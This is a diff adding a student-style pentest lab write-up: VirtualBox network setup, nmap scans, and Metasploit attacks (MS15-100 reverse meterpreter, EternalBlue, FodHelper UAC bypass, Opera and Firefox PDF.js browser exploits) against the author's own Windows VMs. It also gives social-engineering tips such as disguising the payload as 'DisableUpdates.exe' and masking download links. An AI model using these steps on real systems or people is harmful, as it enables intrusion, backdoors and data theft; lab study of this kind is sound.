@@ -1,42 +1,591 @@
-# NotJeket: A Pentesting Project Overview
+Pentesting Project
 
-## Introduction
-NotJeket is a comprehensive pentesting project focusing on the security analysis of multiple virtual machines (VMs), including a diverse range of Windows environments and a Debian 12 VM configured as a router. This document outlines the project's setup, configuration, and execution, emphasizing practical pentesting approaches and tools.
+NotJeket
 
-## Project Configuration
+I've undergone a project to pentest multiple virtual machines, mostly windows but I've decided to add a
 
-### Pre-Planning and VirtualBox Setup
-- **Objective**: Ensure VMs can communicate within a private network, isolated from external networks.
-- **Implementation**: Utilization of a NAT-Network in VirtualBox, enabling DHCP for automatic IP address assignment.
+Debian 12 VM to act as a router.
 
-### Debian 12 VM Router Configuration
-- **Network Adapters**: Two adapters configured; a bridged adapter for internet access and a NAT-Network adapter for internal network communication.
-- **Network Topology**: Adopted a STAR network topology to route all traffic through the Debian VM, acting as a router.
+Pre-Planning
 
-### Debian Router Setup Steps
-1. **Enable IP Forwarding**: Modified `sysctl.conf` to allow IP forwarding.
-2. **Network Adapter Identification**: Used `ip addr show` to identify and configure network adapters.
-3. **Traffic Masquerading**: Installed `iptables` and added rules to masquerade traffic between adapters.
+Vitrual-Box configuration.
 
-### Windows VM Settings
-- **Configuration**: Enabled network sharing, installed antivirus, and activated various protocols and services to mimic an end-user environment.
-- **Software Installation**: Deployed common applications and utilities to replicate a typical user's setup.
+Before we begin any kind of of attacks, we will first need to make sure that the vitual machines see eachother and are able to only communicate with one another inside a private network. For this I chose to place all of them inside a NAT-Network. This NAT-Network will be configured as follows.
 
-## Pentesting VM Configuration
-- **Selection**: Chose Parrot OS for the pentesting VM, emphasizing on updating the system before proceeding with pentesting activities.
+![](RackMultipart20240214-1-afrfh6_html_3f8f2db8ebbb2c27.png)
 
-## Pentesting Phases
+To create the NAT-Network we will need to access the network menu inside the Oracle VM context.
+ ![](RackMultipart20240214-1-afrfh6_html_667db9459e6b822f.png)
 
-### Information Gathering
-- **Tool Used**: `nmap` for network scanning and identifying open ports and services on the target VMs.
+We create said network and we enable DHCP so any devices that will connect to said network, will be automaticly assigned an IPv4 adress.
 
-### Vulnerability Assessment
-- **Tools**: MetaSploit and ExploitDB for identifying and exploiting vulnerabilities.
-- **Process**: Setting target hosts (`RHOSTS`) and searching for available exploits based on the OS version and services identified.
+![](RackMultipart20240214-1-afrfh6_html_7036004f4e280314.png)
 
-### Exploit Execution
-- **Windows 8.1 VM**: Demonstrated with a proof of concept using the MS15-100 vulnerability.
-- **Windows 10 and Windows 11 VMs**: Illustrated different exploit strategies, including browser-based exploits and privilege escalation techniques.
+After that is done we can add the other virtual machines.
 
-## Conclusion
-The project NotJeket provides a deep dive into practical pentesting against a controlled environment of Windows and Debian VMs. It highlights the critical steps for setting up a pentesting lab, conducting information gathering, vulnerability assessment, and executing exploits to understand the security posture of the target systems.
+**Debian 12 VM router settings**
+
+below are the options I've chose for the virtual machine that will act as a router
+
+![](RackMultipart20240214-1-afrfh6_html_3f5bc969b2287159.png)
+
+To make the VM act as a router I've placed 2 network adapters those being a briged adapter, and the NAT-Network adapter. This will facilitate access to the outside internet. As for the network topology I've decided to go with a STAR network topology, facilitating that all the traffic (IN/OUT) will go trough the router first.
+
+Down below are the network settings cor both adapters.
+
+1st adapter :
+ ![](RackMultipart20240214-1-afrfh6_html_f6f5adf571e3cfa9.png)
+
+2nd adapter:
+ ![](RackMultipart20240214-1-afrfh6_html_c931bf34aa9e0868.png)
+
+After all this is done we can move inside the VM and begin the configuration steps.
+
+In Debian this all begins with the modification of sysctl.conf to enable the rule of IP Forwarding. For that we use:
+
+sudo nano /etc/sysctl.conf
+
+We will search for the "net.ipv4.ip\_forward" and we remove the "#" (comment) to enable the feature.
+
+After that we save(CTRL+S) and exit(CTRL+X).
+
+We can check if the feature was enabled with:
+
+sudo sysctl -p
+
+After we confirm that the feature works. We move on with the next command:
+
+Ip addr show
+
+This command shows us the network adapters as well as more info on said adapters.
+ ![](RackMultipart20240214-1-afrfh6_html_b4b24b3172a1d209.png)
+
+Using the MAC address as a pointer we can deduct that the adapter enp0s3 is the NAT-Network adapter, and enp0s8 is the briged addapter
+
+To facilitate network to enp0s3 we will install iptables,wich provides us with the option to MASQUERADE all the traffic from one adapter to another:
+ sudo apt install iptables
+
+![](RackMultipart20240214-1-afrfh6_html_e4822447b74dc418.png)
+
+After the install is done we will add the following rule to the iptables, to provide access to the internet to the devices connected in the NAT-Netowrk, with the following command:
+
+sudo iptables -t nat -A POSTROUTING -o enp0s8 -j MASQUERADE
+
+Said command provides us with a bypass, basicly making all the traffic go trough the Debian router.
+
+We can check if the settings were place with:
+
+Sudo iptables -t nat -L
+
+![](RackMultipart20240214-1-afrfh6_html_b906d2a7bde522af.png)
+
+As for the last step we will restart the networking with the command:
+
+Systemctl restart networking
+
+After all that is done we can check if we got traffic in the virtual machines by simply checking the activity from the windows ethernet status.
+
+![](RackMultipart20240214-1-afrfh6_html_f534df3f662a596b.png)
+
+Windows Settings
+
+![](RackMultipart20240214-1-afrfh6_html_cb5c461e4a56823d.png)
+
+To imitate a windows system used by most end users there were rules placed inside each machine, these rules being:
+
+- All VM will be able to communicate with each-other using windows network sharing centre
+- Each machine will have an antivirus installed.
+- From features the following will be activated: TCPIP, SNMP ( simple network management protocol), Telnet, TFTP Client. As can be seen from the image below.
+
+![](RackMultipart20240214-1-afrfh6_html_1f7ffc9ffccf109d.png)
+
+As well as all this, to emulate a usual windows system these will be installed along-side them:
+
+7-zip,notepad++, open office, avast home edition, adobe flash player, chrome/firefox, java SE, bittorrent/utorrent, limewire , extensii de browser cum ar fii hoverzoom, teamviewer, adobe acrobat reader, adobe shockwave player , skype/yahoo messenger, pdf readers (foxit, Sumatra), VLC media player, CC cleaner, nodejs, tlauncher,.
+
+After all this is done, we can double check if all the windows machines see eachother using the following command:
+
+Net view
+
+![](RackMultipart20240214-1-afrfh6_html_62dc3a81cf85758e.png)
+
+As can be seen all machines are visible to one another.
+
+Pentest VM comnfiguration.
+
+For the pentest virtual machine I've decided to go with Parrot OS, having the following configuration.
+
+![](RackMultipart20240214-1-afrfh6_html_d0926f6d5b09e9cd.png)
+
+After all this we will boot into the system and update everything using the command:
+
+Sudo apt update && sudo apt upgrade.
+
+![](RackMultipart20240214-1-afrfh6_html_de4b8777b345a445.png)
+
+**Information Gathering**
+
+To see all the other virtual machines present in the network e will use the nmap command
+
+Nmap -sn 10.0.2.0/24
+
+where:
+
+- Nmap: Command to audit a netowrk
+- -sn: nmap option for ping sweep
+- 10.0.2.0/24: Internal network range
+
+Output: ![](RackMultipart20240214-1-afrfh6_html_9d0022568b99231b.png)
+
+From this output we can see all the machines connected
+
+Nmap -sV -Pn 10.0.2.x
+
+Where :
+
+- sV: an option that allows system information detection
+- Pn: takes any ip address as only to avoid the host is down error
+- 10.0.2.x ip for the machines inside the NAT-Network.
+
+The command was run for every machine. Bellow we can see more info about the Win 8.1 VM machine
+
+![](RackMultipart20240214-1-afrfh6_html_136e1a32c8b17631.png)
+
+From this outout we can see more info about said machine like:
+
+- The host runs on windows 8.1
+- Said host has 6 ports open
+
+Same process was repeated for all the other hosts:
+
+Host 10.0.2.2 – [Windows?]
+
+Found ports open for this virtual machine 135,145,5357.
+
+![](RackMultipart20240214-1-afrfh6_html_af213ccbd4b1d7d7.png)
+
+10.0.2.8 – [Windows 8.1]
+
+After the scan execution we can se it has open ports (135,139,445,1688,2869,5357,49155) as well as finding from the mac address that it's running windows 8.1
+
+![](RackMultipart20240214-1-afrfh6_html_ebf91cd2fb998f94.png)
+
+10.0.2.9 – [Windows 10]
+
+After the scan we can see the following open ports (135,139,445,5357).
+
+![](RackMultipart20240214-1-afrfh6_html_f184870d78d2d9d2.png)
+
+10.0.2.11 – [WINDOWS 11]
+
+After the scan we can see that the windows 11 machine has the following open ports (135,139,445,5357).
+
+![](RackMultipart20240214-1-afrfh6_html_8af32d15e3d37b2b.png)
+
+10.0.2.12 – [ParrotOS]
+
+We can see that even Parrot OS has these ports open (139,445).
+
+![](RackMultipart20240214-1-afrfh6_html_f68be202e54e9ac9.png)
+
+After all this info gathering we can see that pretty much all windows machine have the same open ports.
+
+Vulnerabilities.
+
+The tool that I chose to work with is MetaSploit, and for vulnerabilities finding I've chosen to use in parralel ExploitDB as well. We can begin using MetaSploit with the following command:
+
+msfconsole
+
+Output:
+
+![](RackMultipart20240214-1-afrfh6_html_b15da975b65f0daa.png)
+
+**Exploit Searching**
+
+Before we can start looking up exploits advalable we must set the RHOSTS, 10.0.2.8.
+
+The RHOST can be set with the following command:
+
+Set RHOSTS \<Target IP\>
+
+![](RackMultipart20240214-1-afrfh6_html_d8f05eb0dce7c196.png)
+
+Afterwards, using the knowledge provided by scanning with nmap, we realize that the virtual machine in question is using Windows 8.1. With this information, using the search command, we can see which exploits are available. The command is entered in the terminal as follows:
+
+search \<Target OS\>
+
+the command offers us this output
+
+![](RackMultipart20240214-1-afrfh6_html_69d93dbcf904faae.png)
+
+From this, we can observe the following:
+
+- Exploit name
+- Release date
+- Rank: (from Excellent to manual ranking) Excellent being an exploit that won't cause a system crash on the target system, while manual ranking indicates unstable exploits/DoS attacks.
+- Check: This notifies you if the target machine is vulnerable to the respective exploit.
+- Description: A simple description of what the exploit does.
+
+After running the command on the Windows 8 machine, it can be seen that it is vulnerable to the following exploits. They will be numbered according to rank:
+
+Exploit ID | Exploit | Release Date | DescriptionExcelent:
+
+- 18 exploit/windows/local/agnitum\_outpost\_acs 2013-08-02 Agnitul Outpost Internet Security Local Privilege Escalation
+- 19 exploit/windows/misc/ahsay\_backup\_fileupload 2019-06-01 Ahsay Backup v7.x.x - 8.1.1.50 (authenticated) file upload
+- 20 exploit/windows/http/apache\_chunked 2002-06-19 Apache Win32 Chunked Encoding
+- 39 exploit/windows/misc/hp\_dataprotector\_cmd\_exec 2014-11-02 HP Data Protector 8.10 Remote Command Execution
+- 46 exploit/windows/http/manageengine\_unpload\_central\_samj\_rce\_cve\_2022\_47966 2023-01-10 ManageEngine Endpoint Central Unauthenticated SAML RCE
+- 47 exploit/multi/http/eventlog\_file 2014-08-31 ManageEngine EventLog Analyzer Arbitrary File Upload
+- 52 exploit/windows/http/sitecore\_xp\_cve\_2021\_42237 2021-11-02 Sitecore Experience Platform (XP) PreAuth Deserialization RCE
+- 53 exploit/multi/http/splunk\_privilege\_escalation\_cve\_2023\_37207 2023-06-01 Splunk "edit\_user" Capability Privilege Escalation
+- 60 exploit/windows/http/zentao\_pro\_rce 2020-06-20 ZenTao Pro 8.8.2 Remote Code Execution
+
+Great:
+
+- 48 exploit/windows/http/editregistry\_host 2006-10-21 Novell eDirectory NDS (AGENT HOST) Header Overflow
+- 51 exploit/windows/http/bea\_weblogic\_post\_bot 2008-07-17 Oracle WebLogic Apache Connector POST Request Buffer Overflow
+
+Good:
+
+- 20 exploit/windows/http/apache\_chunked 2002-06-19 Apache Win32 Chunked Encoding
+- 49 exploit/windows/oracle/tns\_argument 2001-06-28 Oracle 8i TNS Listener SERVICE\_NAME Buffer Overflow
+- 50 exploit/windows/oracle/tns\_service\_name 2002-05-27 Oracle 8i TNS Listener SERVICE\_NAME Buffer Overflow
+- 61 exploit/multi/http/phpmyadmin\_lfi\_rce 2018-06-19 phpMyAdmin Authenticated Remote Code Execution
+
+Normal:
+
+- 42 exploit/windows/local/ntapphelpcachecontrol 2014-09-30 MS15-001 Microsoft Windows NtApphelpCacheControl Improper Authorization Check
+- 43 auxiliary/scanner/http/ms15\_034\_http\_sys\_memory\_dump 2014-04-14 MS15-034 HTTP Protocol Stack Request Handling HTTP.SYS Memory Information Disclosure
+
+Manual:
+
+- 44 exploit/windows/local/ms15\_078\_atmfd\_bof 2015-07-11 MS15-078 Microsoft Windows Font Driver Buffer Overflow
+
+From the scan, it can be observed that we have a total of 18 exploits that can be executed on the Windows 8 virtual machine. Among these are:
+
+- 9 exploits with Excellent rank
+- 2 exploits with Great rank
+- 4 exploits with Good rank
+- 2 exploits with Normal rank
+- 1 exploit with Manual rank.
+
+Based on what we know from the MetaSploit documentation [[LINK](https://docs.metasploit.com/docs/using-metasploit/intermediate/exploit-ranking.html)], the best choices for exploits are those in the categories (Excellent, Great, Good), with the others being used only for specific versions (Normal), while the Manual exploit is considered unstable, more like a DoS (15% success rate).
+
+With this knowledge, we will use the exploits from the Good category and above.
+
+EXPLOITS Windows 8.1
+
+Proof of concept/1st attack attempt.
+
+Exploiting the Windows 8.1 virtual machine.
+
+For a proof of concept, I have chosen to use the MS15-100 attack (Media Centre Vulnerability). Essentially, it creates an FTP host on the attacking machine and uses a link that can be disguised. It sends an executable that can be downloaded by a user. This example is more of a test and familiarization with the Metasploit platform. In this example, there is both an attacker and an inexperienced user.
+
+Step 1: Open Metasploit with SuperUser privileges using the command:
+
+Sudo msfconsole
+
+Step 2: Specify the exploit (MCL) using the command:
+
+use exploit/windows/fileformat/ms15\_100\_mcl\_exe
+
+![](RackMultipart20240214-1-afrfh6_html_e06a4a37fb2a28d8.png)
+
+Step 3: Prepare the payload, in our case reverse\_tcp provided by meterpreter, using the command:
+
+Set payload /windows/meterpeter/reverse\_tcp
+
+![](RackMultipart20240214-1-afrfh6_html_7346e9298dfc0c3e.png)
+
+Step 4: Configure the exploit and verify its options using the command:
+
+Show options
+
+![](RackMultipart20240214-1-afrfh6_html_7f8477e0ec343044.png)
+
+From this output, we can see that we need to configure the following:
+
+- SRVHOST: using the command set SRVHOST \<attack machine's IP\>
+- LHOST: using the command set LHOST \<attack machine's IP\>
+
+![](RackMultipart20240214-1-afrfh6_html_d2e07fe562844cbe.png)
+
+Step 5: Execute the exploit, which is done with the command:
+
+Exploit
+
+![](RackMultipart20240214-1-afrfh6_html_dfa1fd7a2220afdd.png)
+
+As observed, this creates a server that hosts an executable. As a proof of concept, I will download it directly from the provided link, but this application can be modified so that the remote execution code is disguised within an application (game, pictures, video, archive). Additionally, the download link can be masked using URL shortening services or custom URLs that can be created from Metasploit.
+
+Step 6: Downloading the executable and installing it.
+
+By accessing the link in a browser, you can see that it has downloaded an executable, which we then install. Additionally, we receive confirmation in the Metasploit console. ![](RackMultipart20240214-1-afrfh6_html_8e00e689c3dd4fc4.png)
+
+After running it, we can see that we receive output on the console again, confirming that the connection has been established between the attacking machine and the victim through port 52915.
+
+![](RackMultipart20240214-1-afrfh6_html_2b558120783ba71.png)
+
+We can also check for existing sessions using the command:
+
+Sessions -i
+
+![](RackMultipart20240214-1-afrfh6_html_f9d77e4c00e88e1f.png)
+
+To begin interacting with it, we use the command:
+
+Sessions -I \<ID\> (1 in cazul nostru)
+
+![](RackMultipart20240214-1-afrfh6_html_37241db33ba827de.png)
+
+From here, a terminal is provided, and to find more information about its uses, we write "help", where available commands are provided.
+
+| ![](RackMultipart20240214-1-afrfh6_html_50b23c24fb7b862a.png) | ![](RackMultipart20240214-1-afrfh6_html_a0a898d2f5a13211.png) | ![](RackMultipart20240214-1-afrfh6_html_a00aeef5c8b1ae52.png) | ![](RackMultipart20240214-1-afrfh6_html_9bcd3f243c63d46e.png) |
+| --- | --- | --- | --- |
+
+As observed, we have full access for remote execution. As a proof of concept to demonstrate that the application works, I chose to remotely open the calculator application (calc.exe). This is done with the command:
+
+Execute -f calc.exe
+
+![](RackMultipart20240214-1-afrfh6_html_283345f25d52f374.png)
+
+And as observed from the terminal, as well as from the operating system, the calculator application has indeed been launched from the attacking virtual machine. ![](RackMultipart20240214-1-afrfh6_html_b78e9ba9357c396c.png)
+
+What emerges from this proof of concept is that, in practice, if the payload is disguised as any other application that someone known would need or trust to download, and if the FTP link is modified to be masked, or if the file is sent through a messaging application (WhatsApp as an example), you would have a permanently active gateway to their computer, thus creating possibilities for attacks/data exfiltration.
+
+2nd attack. EternalBlue
+
+=====================================================================================
+
+For the second exploit, I chose to use MS17\_010, which was created by the NSA for intelligence gathering, allowing remote access to the target machine. To begin the exploit, the command is used:
+
+Sudo msfconsole
+
+After entering the console, the exploit is used with the command:
+
+Use /exploit/windows/smb/ms17\_010\_eternalblue
+
+![](RackMultipart20240214-1-afrfh6_html_f37051450853e450.png)
+
+To see what options are available for the exploit, the command is used:
+
+Show options
+
+![](RackMultipart20240214-1-afrfh6_html_73cb569ef65297e2.png)
+
+The parameters of LHOST and RHOSTS will be set using the commands:
+
+RHOSTS: with the command set RHOSTS \<attack machine's IP\>
+
+LHOST: with the command set LHOST \<attack machine's IP\>
+
+In our case, the attack machine's IP is 10.0.2.13, and the exploitation machine is 10.0.2.8.
+
+After these parameters have been set, the exploit can be started with the command:
+
+Exploit
+
+![](RackMultipart20240214-1-afrfh6_html_e133144dec79409.png)
+
+From the respective output, it can be seen that we have access to the Windows 8 virtual machine. To see which user we are interacting with, we can run the command:
+
+Getuid
+
+![](RackMultipart20240214-1-afrfh6_html_4568a71b18b09c50.png)
+
+Conclusion: This attack is an older exploit that is still supported on various Windows operating systems. It creates a backdoor in vulnerable operating systems, reminding us that no system is considered 100% secure. We are responsible for protecting our personal data. This type of attack was the main vector of exploitation for the major ransomware attack, WannaCry, which affected not only individuals' operating systems but also essential company systems, such as those for water, electricity, and security.
+
+**Win 10 Exploit.**
+
+Exactly like in Windows 8, the same steps apply to find exploits. First, open an instance of msfconsole, then search for exploits using the command:
+
+Search exploit windows 10
+
+1st exploit.
+
+For the first exploit on Windows 10, I chose to perform an information gathering operation to see what else we can exploit on that particular machine. To run this exploit, we use the command:
+
+Use auxiliary/gather/browser\_info
+
+![](RackMultipart20240214-1-afrfh6_html_ce5a379f7ee32382.png)
+
+Afterward, we run the command:
+
+Show options
+
+![](RackMultipart20240214-1-afrfh6_html_43b90257e21dacb5.png)
+
+From here, we can configure SRVHOST to make our attacking machine a local server through which we can send/receive requests. This is configured with the command::
+
+Set SRVHOST \<ip-ul\_masinii\_de\_attack\> (10.0.2.13)
+
+After that, the exploit is run with the command:
+
+Exploit
+
+![](RackMultipart20240214-1-afrfh6_html_a8ca493e0e79514a.png)
+
+On the target machine, you navigate to the provided link, and once the connection is established, various information about the system is provided to us. ![](RackMultipart20240214-1-afrfh6_html_8dd4556730066559.png)
+
+Conclusion: This exploit is a vector of attack on the Firefox browser version 41.0, which provides us with useful information such as the operating system, Java version, Firefox version, whether the browser accepts JavaScript attacks, etc.
+
+This exploit is an information gatherer that happened to work on the version of Firefox installed at the current moment. While not present in the example above, the exploit also allows for session hijacking and cookie jacking capabilities, thereby obtaining more information about the accounts/cards saved in the browser. This presents a security risk for systems used by inexperienced users.
+
+**2**** nd **** exploit**
+
+Remote UAC Protection Bypass via FodHelper Registry Key. This exploit utilizes an active meterpreter session to elevate privileges. It relies on the presence of an already active session.
+
+To begin the session, the exploit (MCL) is specified using the command:
+
+use exploit/windows/fileformat/ms15\_100\_mcl\_exe
+
+![](RackMultipart20240214-1-afrfh6_html_e06a4a37fb2a28d8.png)
+
+The payload is prepared, in our case reverse\_tcp provided by meterpreter, using the command:
+
+Set payload /windows/meterpeter/reverse\_tcp
+
+![](RackMultipart20240214-1-afrfh6_html_7346e9298dfc0c3e.png)
+
+Configuring the exploit and verifying its options is done with the command:
+
+Show options
+
+![](RackMultipart20240214-1-afrfh6_html_7f8477e0ec343044.png)
+
+From this output, we can see that we need to configure the following:
+
+- SRVHOST: using the command set SRVHOST \<attack machine's IP\>
+ - LHOST: using the command set LHOST \<attack machine's IP\>
+
+![](RackMultipart20240214-1-afrfh6_html_d2e07fe562844cbe.png)
+
+To avoid raising suspicions with the user, we will rename this file as a program that anyone would download, such as DisableUpdates.exe, under the assumption that a user might seek a way to disable Windows updates and click on the download link (https://wt.tl/t-i6pbp3fvo1).
+
+To package the exploit, the command is used:
+
+Exploit
+
+![](RackMultipart20240214-1-afrfh6_html_dfa1fd7a2220afdd.png)
+
+As observed, the executable has been created at the location /root/.msf4/local/msf.mcl. This will be taken and uploaded to a file transfer link, such as wetransfer, and then sent as a message or uploaded to support forums.
+
+The user will access the malicious link and download the file. When opened, they will believe it is a program that disables updates, but in reality, it will provide a backdoor into the operating system.
+
+After confirming that an active session exists, we can use the bypassuac\_fodhelper exploit to gain elevated UAC privileges. This is done with the command:
+
+Use exploit/windows/local/bypassuac\_fodhelper
+
+![](RackMultipart20240214-1-afrfh6_html_291220388118feab.png)
+
+To see if the options are configured, the command is used:
+
+Show options
+
+![](RackMultipart20240214-1-afrfh6_html_35b9764b7a0b227.png)
+
+As seen, the parameters need to be configured:
+
+- LHOST: with the command set LHOST \<attack machine's IP\>
+ - Session: with the command set session 2 \<active meterpreter session\>
+
+After configuring these parameters, the exploit is run with the command:
+
+Exploit
+
+![](RackMultipart20240214-1-afrfh6_html_a4ba7e9902d6666d.png)
+
+As observed, the exploit works but gives us an error that there is already a session in elevated status (from previous tests). To interact with that session, the command is used:
+
+Sessions -I \<ID\_Sessiune\> (2)
+
+![](RackMultipart20240214-1-afrfh6_html_ad660576124f3a2a.png)
+
+And as can be seen, we now have remote access to the Windows 10 system. To see who we are, we run the command:
+
+Getuid
+
+![](RackMultipart20240214-1-afrfh6_html_d9c3865e00807ba5.png)
+
+Conclusion: Just like the EternalBlue attack on Windows 8, we can observe that the Windows 10 operating system is vulnerable to UAC elevation attacks. This provides us with access to the operating system through a terminal with elevated permissions, allowing us to execute commands and exfiltrate important user data.
+
+Win 11 Exploits
+
+1st exploit
+
+I've chosen to run an Opera exploit, which in practice allows script injections on the Opera configuration page (opera:config). This creates a gateway for attacks to change settings and execute code. It relies on poor configuration found in Opera versions from 9.10 downwards.
+
+The exploit is used with the command:
+
+Use exploit/multi/browser/opera\_configoverwrite
+
+To find more information about this module, the command is used:
+
+Show options
+
+![](RackMultipart20240214-1-afrfh6_html_f54e00140b318178.png)
+
+To begin the exploit, the parameters SRVHOST and LHOST must be configured. This is done with the command:
+
+- SRVHOST: set SVHOST \<attack machine's IP\>
+ - LHOST: set LHOST \<attack machine's IP\>
+
+Afterwards, the exploit can be executed with the command:
+
+Exploit
+
+![](RackMultipart20240214-1-afrfh6_html_bbd00539ea9ece79.png)
+
+As can be seen, a TCP server is started on an IP address. This will be accessed by a user who will allow us to execute commands.
+
+When a user accesses the malicious link, feedback is provided:
+
+![](RackMultipart20240214-1-afrfh6_html_403c91ba027a7266.png)
+
+From here, we have access to execute payloads. These payloads can be discovered with the command:
+
+Show advanced
+
+![](RackMultipart20240214-1-afrfh6_html_5d3b3e48b4d905f4.png)
+
+From here, the attacker has all the possibilities to launch attacks on the affected machine using this exploit. For a proof of concept, the calculator application on Windows 11 was launched using the command:
+
+Execute -f calc.exe
+
+![](RackMultipart20240214-1-afrfh6_html_778746c1640c2a3e.png)
+
+As long as the attacker has a stable connection to the victim, they can perform remote execution or file exfiltration.
+
+2nd attempt. Firefox PDFJS privilege escalation
+
+There is a session hijacking exploit in Firefox that relies on injecting JavaScript code into PDF files. Again, it relies on social engineering to trick the victim into accessing a link where they download a PDF with malicious code.
+
+To start the exploit, the command is used:
+
+use exploit/multi/browser/firefox\_pdfjs\_privilege\_escalation
+
+More information about this exploit can be seen with the command:
+
+show info
+
+![](RackMultipart20240214-1-afrfh6_html_132ca4c10c0c4327.png)
+
+SRVHOST is configured with the command:
+
+Set SRVHOST \<attack machines ip\> (10.0.2.13)
+
+Then the exploit is initiated:
+
+![](RackMultipart20240214-1-afrfh6_html_2ed7299f382ff1b.png)
+
+This starts a server that the victim can access, automatically downloading the malicious file, just as shown below. After the victim has accessed the session, confirmation can be seen that a session has been created, allowing us to interact. This interaction is done with the command:
+
+Sessions -I \<ID sessiune\> (1)
+
+It appears to have a similar interaction to meterpreter exploits. I've chosen to run the command:
+
+Getuid
+
+![](RackMultipart20240214-1-afrfh6_html_b45027c7b80b272b.png)
+
+Conclusively, from what I can observe, most of the successful exploits on the Windows platform seem to be those that rely on RAT (Remote Access Tool) applications. While these are effective, they require knowledge of social engineering or a suitable context to get the victim to interact with them. Certainly, there are also options to exploit unsupported versions of browsers vulnerable to JS or Flash code, but gradually, these are becoming less feasible attack vectors.
